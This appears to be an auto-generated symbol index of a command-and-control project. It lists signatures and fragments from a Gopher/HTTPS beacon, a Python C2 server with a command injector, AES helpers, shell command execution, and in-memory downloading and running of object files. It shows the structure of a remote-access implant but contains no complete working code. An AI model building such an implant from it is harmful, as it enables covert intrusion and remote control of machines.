### void (function) `typedef void (*bof_func_t)(char*, int);`
- Defined: `gopher_beacon.c:60`
- Doc: === TIPOS Y SÍMBOLOS FALTANTES ===
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### volatile (function) `asm volatile( // Guardar frame pointer "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" // Guardar callee-saved registers "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" //`
- Defined: `gopher_beacon.c:143`
- Doc: CRÍTICO: El stack DEBE estar alineado a 16 bytes ANTES del call Después de 'call', RSP está desalineado 8 bytes (por el 
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### va_start (function) `va_start(args, fmt);`
- Defined: `gopher_beacon.c:193`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### va_end (function) `va_end(args);`
- Defined: `gopher_beacon.c:197`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### memcpy (function) `memcpy(g_beacon_output + g_output_len, data, len);`
- Defined: `gopher_beacon.c:208`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### fprintf (function) `fprintf(stderr, "[!] Trampolín: mmap falló\n");`
- Defined: `gopher_beacon.c:221`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### munmap (function) `munmap(code, code_size);`
- Defined: `gopher_beacon.c:237`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### free (function) `free(g_trampolines);`
- Defined: `gopher_beacon.c:254`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### fflush (function) `fflush(stdout);`
- Defined: `gopher_beacon.c:319`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### snprintf (function) `snprintf(full_selector, sizeof(full_selector), "/report/%s", post_data);`
- Defined: `gopher_beacon.c:326`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### close (function) `close(sockfd);`
- Defined: `gopher_beacon.c:345`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### send (function) `send(sockfd, req, strlen(req), 0);`
- Defined: `gopher_beacon.c:350`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_set_flags (function) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- Defined: `gopher_beacon.c:383`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_write (function) `BIO_write(b64, input, len);`
- Defined: `gopher_beacon.c:384`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_flush (function) `BIO_flush(b64);`
- Defined: `gopher_beacon.c:385`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_get_mem_ptr (function) `BIO_get_mem_ptr(b64, &bptr);`
- Defined: `gopher_beacon.c:386`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### BIO_free_all (function) `BIO_free_all(b64);`
- Defined: `gopher_beacon.c:390`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### AES_init_ctx (function) `AES_init_ctx(&ctx, key);`
- Defined: `gopher_beacon.c:420`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### AES_ECB_encrypt (function) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- Defined: `gopher_beacon.c:428`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### memset (function) `memset(iv_buf + block_size, 0, 16 - block_size);`
- Defined: `gopher_beacon.c:437`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strdup (function) `return strdup("[!] Empty command");`
- Defined: `gopher_beacon.c:478`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### pclose (function) `pclose(fp);`
- Defined: `gopher_beacon.c:488`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### perror (function) `perror("calloc");`
- Defined: `gopher_beacon.c:682`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### call_bof_isolated (function) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- Defined: `gopher_beacon.c:878`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### inet_ntop (function) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- Defined: `gopher_beacon.c:912`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strcat (function) `strcat(result, ip);`
- Defined: `gopher_beacon.c:914`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### strlen (function) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- Defined: `gopher_beacon.c:918`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### setvbuf (function) `setvbuf(stdout, NULL, _IOLBF, 0);`
- Defined: `gopher_beacon.c:996`
- Doc: memcpy(output, g_beacon_output, g_output_len); output[g_output_len] = '\0'; out_len = g_output_len; fprintf(stderr, "[DE
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### printf (function) `printf("[*] Beacon starting...\n");`
- Defined: `gopher_beacon.c:998`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### srand (function) `srand(time(NULL));`
- Defined: `gopher_beacon.c:1001`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### sleep (function) `sleep(6);`
- Defined: `gopher_beacon.c:1028`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### gethostname (function) `gethostname(hostname, sizeof(hostname) - 1);`
- Defined: `gopher_beacon.c:1122`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddStringToObject (function) `cJSON_AddStringToObject(root, "output", output);`
- Defined: `gopher_beacon.c:1130`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddNumberToObject (function) `cJSON_AddNumberToObject(root, "pid", (double)getpid());`
- Defined: `gopher_beacon.c:1133`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_AddNullToObject (function) `cJSON_AddNullToObject(root, "result_portscan");`
- Defined: `gopher_beacon.c:1138`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### cJSON_Delete (function) `cJSON_Delete(root);`
- Defined: `gopher_beacon.c:1142`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

### RAND_bytes (function) `RAND_bytes(iv_out, 16);`
- Defined: `gopher_beacon.c:1148`
- Depends on: `aes.h`, `beacon.h`, `cJSON.h`

## gopher_c2.py

### encrypt_data (function) `def encrypt_data(data)`
- Defined: `gopher_c2.py:28`

### decrypt_data (function) `def decrypt_data(b64_data)`
- Defined: `gopher_c2.py:37`

### handle_client (function) `def handle_client(conn, addr)`
- Defined: `gopher_c2.py:45`

### main (function) `def main()`
- Defined: `gopher_c2.py:127`

### command_injector (function) `def command_injector()`
- Defined: `gopher_c2.py:136`

## include/aes.c

### __attribute__ (function) `static __attribute__((unused)) uint8_t getSBoxValue(uint8_t num)`
- Defined: `include/aes.c:12`
- Doc: define KEYLEN_256 32 define RKLENGTH (4 * (Nr + 1)) define BLOCKLEN 16
- Depends on: `include/aes.h`

### __attribute__ (function) `static __attribute__((unused)) uint8_t getSBoxInvert(uint8_t num)`
- Defined: `include/aes.c:34`
- Depends on: `include/aes.h`

### __attribute__ (function) `static __attribute__((unused)) uint8_t Td0(int x)`
- Defined: `include/aes.c:56`
- Depends on: `include/aes.h`

### __attribute__ (function) `static __attribute__((unused)) uint8_t Td1(int x)`
- Defined: `include/aes.c:58`
- Depends on: `include/aes.h`

### __attribute__ (function) `static __attribute__((unused)) uint8_t Td2(int x)`
- Defined: `include/aes.c:59`
- Depends on: `include/aes.h`

### __attribute__ (function) `static __attribute__((unused)) uint8_t Td3(int x)`
- Defined: `include/aes.c:60`
- Depends on: `include/aes.h`

### __attribute__ (function) `static __attribute__((unused)) uint8_t Td4(int x)`
- Defined: `include/aes.c:61`
- Depends on: `include/aes.h`

### KeyExpansion (function) `static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)`
- Defined: `include/aes.c:166`
- Doc: This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states.
- Depends on: `include/aes.h`

### AES_init_ctx (function) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)`
- Defined: `include/aes.c:238`
- Depends on: `include/aes.h`

### AES_init_ctx_iv (function) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)`
- Defined: `include/aes.c:244`
- Doc: if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
- Depends on: `include/aes.h`

### AES_ctx_set_iv (function) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)`
- Defined: `include/aes.c:249`
- Depends on: `include/aes.h`

### AddRoundKey (function) `static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)`
- Defined: `include/aes.c:257`
- Doc: This function adds the round key to state. The round key is added to the state by an XOR function.
- Depends on: `include/aes.h`

### SubBytes (function) `static void SubBytes(state_t* state)`
- Defined: `include/aes.c:271`
- Doc: The SubBytes Function Substitutes the values in the state matrix with values in an S-box.
- Depends on: `include/aes.h`

### ShiftRows (function) `static void ShiftRows(state_t* state)`
- Defined: `include/aes.c:286`
- Doc: The ShiftRows() function shifts the rows in the state to the left. Each row is shifted with different offset. Offset = R
- Depends on: `include/aes.h`

### xtime (function) `static uint8_t xtime(uint8_t x)`
- Defined: `include/aes.c:313`
- Depends on: `include/aes.h`

### MixColumns (function) `static void MixColumns(state_t* state)`
- Defined: `include/aes.c:320`
- Doc: MixColumns function mixes the columns of the state matrix
- Depends on: `include/aes.h`

### Multiply (function) `static uint8_t Multiply(uint8_t x, uint8_t y)`
- Defined: `include/aes.c:340`
- Doc: Multiply is used to multiply numbers in the field GF(2^8) Note: The last call to xtime() is unneeded, but often ends up 
- Depends on: `include/aes.h`

### InvMixColumns (function) `static void InvMixColumns(state_t* state)`
- Defined: `include/aes.c:370`
- Doc: MixColumns function mixes the columns of the state matrix. The method used to multiply may be difficult to understand fo
- Depends on: `include/aes.h`

### InvSubBytes (function) `static void InvSubBytes(state_t* state)`
- Defined: `include/aes.c:391`
- Doc: The SubBytes Function Substitutes the values in the state matrix with values in an S-box.
- Depends on: `include/aes.h`

### InvShiftRows (function) `static void InvShiftRows(state_t* state)`
- Defined: `include/aes.c:402`
- Depends on: `include/aes.h`

### Cipher (function) `static void Cipher(state_t* state, const uint8_t* RoundKey)`
- Defined: `include/aes.c:433`
- Doc: Cipher is the main function that encrypts the PlainText.
- Depends on: `include/aes.h`

### InvCipher (function) `static void InvCipher(state_t* state, const uint8_t* RoundKey)`
- Defined: `include/aes.c:459`
- Doc: if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
- Depends on: `include/aes.h`

### AES_ECB_encrypt (function) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)`
- Defined: `include/aes.c:488`
- Doc: AddRoundKey(round, state, RoundKey); if (round == 0) { break; } InvMixColumns(state); } } #endif // #if (defined(CBC) &&
- Depends on: `include/aes.h`

### AES_ECB_decrypt (function) `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)`
- Defined: `include/aes.c:495`
- Depends on: `include/aes.h`

### XorWithIv (function) `static void XorWithIv(uint8_t* buf, const uint8_t* Iv)`
- Defined: `include/aes.c:510`
- Doc: if defined(CBC) && (CBC == 1)
- Depends on: `include/aes.h`

### AES_CBC_encrypt_buffer (function) `void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)`
- Defined: `include/aes.c:520`
- Depends on: `include/aes.h`

### AES_CBC_decrypt_buffer (function) `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)`
- Defined: `include/aes.c:535`
- Depends on: `include/aes.h`

### AES_CTR_xcrypt_buffer (function) `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)`
- Defined: `include/aes.c:558`
- Doc: XorWithIv(buf, ctx->Iv); memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN); buf += AES_BLOCKLEN; } } #endif // #if defined(CBC)
- Depends on: `include/aes.h`

### memcpy (function) `memcpy (ctx->Iv, iv, AES_BLOCKLEN);`
- Defined: `include/aes.c:247`
- Depends on: `include/aes.h`

## include/aes.h

### AES_init_ctx (function) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);`
- Defined: `include/aes.h:40`
- Imported by: `include/aes.c`, `include/aes_cfb.c`, `include/beacon_common.c`

### AES_init_ctx_iv (function) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);`
- Defined: `include/aes.h:43`
- Doc: if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
- Imported by: `include/aes.c`, `include/aes_cfb.c`, `include/beacon_common.c`

### AES_ctx_set_iv (function) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);`
- Defined: `include/aes.h:44`
- Imported by: `include/aes.c`, `include/aes_cfb.c`, `include/beacon_common.c`

### AES_ECB_encrypt (function) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);`
- Defined: `include/aes.h:48`
- Doc: if defined(ECB) && (ECB == 1)
- Imported by: `include/aes.c`, `include/aes_cfb.c`, `include/beacon_common.c`

### AES_ECB_decrypt (function) `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);`
- Defined: `include/aes.h:49`
- Imported by: `include/aes.c`, `include/aes_cfb.c`, `include/beacon_common.c`

### AES_CBC_encrypt_buffer (function) `void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);`
- Defined: `include/aes.h:53`
- Doc: if defined(CBC) && (CBC == 1)
- Imported by: `include/aes.c`, `include/aes_cfb.c`, `include/beacon_common.c`

### AES_CBC_decrypt_buffer (function) `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);`
- Defined: `include/aes.h:54`
- Imported by: `include/aes.c`, `include/aes_cfb.c`, `include/beacon_common.c`

### AES_CTR_xcrypt_buffer (function) `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);`
- Defined: `include/aes.h:58`
- Doc: if defined(CTR) && (CTR == 1)
- Imported by: `include/aes.c`, `include/aes_cfb.c`, `include/beacon_common.c`

## include/aes_cfb.c

### aes256_cfb_encrypt (function) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `include/aes_cfb.c:19`
- Doc: This is the same algorithm the v1 beacon uses to wrap C2 commands and results. The C2 server in c2/server.py implements 
- Depends on: `include/aes.h`

### aes256_cfb_decrypt (function) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `include/aes_cfb.c:47`
- Depends on: `include/aes.h`

### AES_init_ctx (function) `AES_init_ctx(&ctx, key);`
- Defined: `include/aes_cfb.c:23`
- Depends on: `include/aes.h`

### memcpy (function) `memcpy(iv_buf, iv, 16);`
- Defined: `include/aes_cfb.c:26`
- Depends on: `include/aes.h`

### AES_ECB_encrypt (function) `AES_ECB_encrypt(&ctx, encrypted_iv);`
- Defined: `include/aes_cfb.c:31`
- Depends on: `include/aes.h`

### memset (function) `memset(iv_buf + block_size, 0, 16 - block_size);`
- Defined: `include/aes_cfb.c:40`
- Depends on: `include/aes.h`

## include/aes_cfb.h

### aes256_cfb_encrypt (function) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv, const unsigned char* plaintext, size_t len, int* out_len);`
- Defined: `include/aes_cfb.h:8`
- Doc: include <stddef.h>
- Imported by: `tests/crypto_harness.c`

### aes256_cfb_decrypt (function) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv, const unsigned char* ciphertext, size_t len, int* out_len);`
- Defined: `include/aes_cfb.h:11`
- Imported by: `tests/crypto_harness.c`

## include/beacon.h

### BeaconDataParse (function) `void BeaconDataParse(datap *parser, char *buffer, int size);`
- Defined: `include/beacon.h:21`
- Doc: === API para BOFs ===

### BeaconDataPtr (function) `char *BeaconDataPtr(datap *parser, int size);`
- Defined: `include/beacon.h:22`

### BeaconDataInt (function) `int BeaconDataInt(datap *parser);`
- Defined: `include/beacon.h:23`

### BeaconDataShort (function) `short BeaconDataShort(datap *parser);`
- Defined: `include/beacon.h:24`

### BeaconDataLength (function) `int BeaconDataLength(datap *parser);`
- Defined: `include/beacon.h:25`

### BeaconDataExtract (function) `char *BeaconDataExtract(datap *parser, int *size);`
- Defined: `include/beacon.h:26`

### BeaconPrintf (function) `void BeaconPrintf(int type, const char *fmt, ...);`
- Defined: `include/beacon.h:27`

### BeaconOutput (function) `void BeaconOutput(int type, const char *data, int len);`
- Defined: `include/beacon.h:28`

## include/beacon_common.c

### bsb_output_init (function) `int bsb_output_init(size_t capacity)`
- Defined: `include/beacon_common.c:100`
- Doc: { "BeaconOutput",   &g_BeaconOutput_ptr }, { "socket",         &g_socket_ptr }, { "connect",        &g_connect_ptr }, { 
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### bsb_output_cleanup (function) `void bsb_output_cleanup(void)`
- Defined: `include/beacon_common.c:109`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### bsb_output_reset (function) `void bsb_output_reset(void)`
- Defined: `include/beacon_common.c:116`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### BeaconPrintf (function) `void BeaconPrintf(int type, const char *fmt, ...)`
- Defined: `include/beacon_common.c:125`
- Doc: free(g_beacon_output); g_beacon_output = NULL; g_output_capacity = 0; g_output_len = 0; } void bsb_output_reset(void) { 
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### BeaconOutput (function) `void BeaconOutput(int type, const char *data, int len)`
- Defined: `include/beacon_common.c:137`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### create_trampoline (function) `void *create_trampoline(void *target)`
- Defined: `include/beacon_common.c:151`
- Doc: void BeaconOutput(int type, const char *data, int len) { (void)type; if (!g_beacon_output || len <= 0 || !data) return; 
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### cleanup_trampolines (function) `void cleanup_trampolines(void)`
- Defined: `include/beacon_common.c:180`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### get_or_create_trampoline (function) `void *get_or_create_trampoline(void *target)`
- Defined: `include/beacon_common.c:195`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### WriteMemoryCallback (function) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)`
- Defined: `include/beacon_common.c:224`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### https_request (function) `http_response_t https_request(const bsb_config_t *cfg, const char *url,
                         ...`
- Defined: `include/beacon_common.c:236`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### base64_encode (function) `char *base64_encode(const unsigned char *input, int len)`
- Defined: `include/beacon_common.c:291`
- Doc: curl_easy_cleanup(curl); return resp; } long http_code = 0; curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### base64_decode (function) `unsigned char *base64_decode(const char *input, int *len)`
- Defined: `include/beacon_common.c:306`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### _is_unreserved (function) `static int _is_unreserved(unsigned char c)`
- Defined: `include/beacon_common.c:329`
- Doc: if (!buffer) { BIO_free_all(b64); return NULL; } len = BIO_read(b64, buffer, input_len); BIO_free_all(b64); if (*len <= 
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### url_encode (function) `char *url_encode(const char *in, size_t in_len, size_t *out_len)`
- Defined: `include/beacon_common.c:334`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### exec_cmd (function) `char *exec_cmd(const char *cmd, int *out_len)`
- Defined: `include/beacon_common.c:358`
- Doc: static const char hex[] = "0123456789ABCDEF"; out[j++] = '%'; out[j++] = hex[(c >> 4) & 0xF]; out[j++] = hex[c & 0xF]; }
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### bsb_backoff_init (function) `void bsb_backoff_init(bsb_backoff_t *bo, int base, int max)`
- Defined: `include/beacon_common.c:385`
- Doc: if (total >= capacity - 1) { capacity *= 2; char *tmp = realloc(buffer, capacity); if (!tmp) break; buffer = tmp; } } pc
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### bsb_backoff_next (function) `int bsb_backoff_next(bsb_backoff_t *bo)`
- Defined: `include/beacon_common.c:390`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### bsb_backoff_reset (function) `void bsb_backoff_reset(bsb_backoff_t *bo)`
- Defined: `include/beacon_common.c:399`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### get_local_ips (function) `char *get_local_ips(void)`
- Defined: `include/beacon_common.c:405`
- Doc: int bsb_backoff_next(bsb_backoff_t *bo) { int val = bo->current_seconds; bo->current_seconds *= 2; if (bo->current_secon
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### download_bof (function) `unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size)`
- Defined: `include/beacon_common.c:434`
- Doc: for (int i = 0; i < n; i++) { struct sockaddr_in *addr = (struct sockaddr_in*)&ifr[i].ifr_addr; if (addr->sin_family == 
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### init_function_pointers (function) `static void init_function_pointers(void)`
- Defined: `include/beacon_common.c:446`
- Doc: /* --- BOF download --- unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size) { http_r
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### page_align (function) `static size_t page_align(size_t size)`
- Defined: `include/beacon_common.c:471`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### __attribute__ (function) `static void __attribute__((noinline)) call_bof_isolated(bof_func_t func, char *args, uintptr_t ar...`
- Defined: `include/beacon_common.c:477`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### RunELF (function) `int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize,
           unsig...`
- Defined: `include/beacon_common.c:506`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### run_bof_and_capture (function) `char *run_bof_and_capture(unsigned char *elf_data, uint32_t filesize,
                           ...`
- Defined: `include/beacon_common.c:710`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### free (function) `free(g_beacon_output);`
- Defined: `include/beacon_common.c:111`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### va_start (function) `va_start(args, fmt);`
- Defined: `include/beacon_common.c:129`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### va_end (function) `va_end(args);`
- Defined: `include/beacon_common.c:132`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### memcpy (function) `memcpy(g_beacon_output + g_output_len, data, len);`
- Defined: `include/beacon_common.c:145`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### munmap (function) `munmap(code, code_size);`
- Defined: `include/beacon_common.c:169`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### curl_easy_setopt (function) `curl_easy_setopt(curl, CURLOPT_URL, url);`
- Defined: `include/beacon_common.c:244`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### curl_easy_cleanup (function) `curl_easy_cleanup(curl);`
- Defined: `include/beacon_common.c:277`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### curl_easy_getinfo (function) `curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);`
- Defined: `include/beacon_common.c:282`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### BIO_set_flags (function) `BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);`
- Defined: `include/beacon_common.c:295`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### BIO_write (function) `BIO_write(b64, input, len);`
- Defined: `include/beacon_common.c:296`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### BIO_flush (function) `BIO_flush(b64);`
- Defined: `include/beacon_common.c:297`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### BIO_get_mem_ptr (function) `BIO_get_mem_ptr(b64, &bptr);`
- Defined: `include/beacon_common.c:299`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### BIO_free_all (function) `BIO_free_all(b64);`
- Defined: `include/beacon_common.c:303`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### pclose (function) `pclose(fp);`
- Defined: `include/beacon_common.c:363`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### close (function) `close(sockfd);`
- Defined: `include/beacon_common.c:413`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### strdup (function) `return strdup("127.0.0.1");`
- Defined: `include/beacon_common.c:414`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### inet_ntop (function) `inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);`
- Defined: `include/beacon_common.c:424`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### strcat (function) `strcat(result, ip);`
- Defined: `include/beacon_common.c:426`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### strlen (function) `return strlen(result) > 0 ? result : strdup("127.0.0.1");`
- Defined: `include/beacon_common.c:430`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### volatile (function) `asm volatile( "push %%rbp\n\t" "mov %%rsp, %%rbp\n\t" "push %%rbx\n\t" "push %%r12\n\t" "push %%r13\n\t" "push %%r14\n\t" "push %%r15\n\t" "sub $8, %%rsp\n\t" "mov %0, %%rdi\n\t" "mov %1, %%rsi\n\t" "`
- Defined: `include/beacon_common.c:479`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### memset (function) `memset(addr, 0, aligned_size);`
- Defined: `include/beacon_common.c:594`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### call_bof_isolated (function) `call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);`
- Defined: `include/beacon_common.c:690`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### _exit (function) `_exit(0);`
- Defined: `include/beacon_common.c:693`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

### waitpid (function) `waitpid(pid, &status, 0);`
- Defined: `include/beacon_common.c:696`
- Depends on: `include/aes.h`, `include/beacon_common.h`, `include/cJSON.h`

## include/beacon_common.h

### void (function) `typedef void (*bof_func_t)(char*, int);`
- Defined: `include/beacon_common.h:45`
- Doc: broken full+8 pointer trick that leaked memory. typedef struct { char    *data;      /* response body (malloc'd, caller 
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### bsb_output_init (function) `int bsb_output_init(size_t capacity);`
- Defined: `include/beacon_common.h:93`
- Doc: Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure.
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### bsb_output_cleanup (function) `void bsb_output_cleanup(void);`
- Defined: `include/beacon_common.h:96`
- Doc: Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure. int bsb_out
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### bsb_output_reset (function) `void bsb_output_reset(void);`
- Defined: `include/beacon_common.h:99`
- Doc: Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure. int bsb_out
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### BeaconPrintf (function) `void BeaconPrintf(int type, const char *fmt, ...);`
- Defined: `include/beacon_common.h:102`
- Doc: Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure. int bsb_out
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### BeaconOutput (function) `void BeaconOutput(int type, const char *data, int len);`
- Defined: `include/beacon_common.h:105`
- Doc: Initialize the output buffer. Call once at beacon startup. * Returns 0 on success, -1 on allocation failure. int bsb_out
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### create_trampoline (function) `void *create_trampoline(void *target);`
- Defined: `include/beacon_common.h:108`
- Doc: /* Free the output buffer. Call at beacon shutdown. void bsb_output_cleanup(void); /* Reset the output buffer for a new 
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### cleanup_trampolines (function) `void cleanup_trampolines(void);`
- Defined: `include/beacon_common.h:109`
- Depends on: `include/config.h`
